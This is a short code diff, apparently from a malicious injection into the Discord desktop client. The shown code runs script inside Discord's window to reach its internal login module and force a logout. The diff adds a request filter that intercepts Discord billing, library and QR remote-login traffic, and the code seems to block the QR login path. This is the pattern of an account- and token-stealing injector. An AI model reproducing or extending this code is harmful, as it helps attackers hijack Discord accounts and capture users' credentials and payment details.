@@ -12,6 +12,18 @@ function FirstTime() {
     return BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', true).then(response => {}), ![];
 }
 
+const Filter = {
+    'urls': [
+        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
+        "https://*.discord.com/api/v*/applications/detectable",
+        "https://discord.com/api/v*/applications/detectable",
+        "https://*.discord.com/api/v*/users/@me/library",
+        "https://discord.com/api/v*/users/@me/library",
+        "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
+        "https://discord.com/api/v*/users/@me/billing/subscriptions",
+        "wss://remote-auth-gateway.discord.gg/*"
+    ]
+};
 
 session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
     if (FirstTime()) details["url"].startsWith("wss://") ? callback({
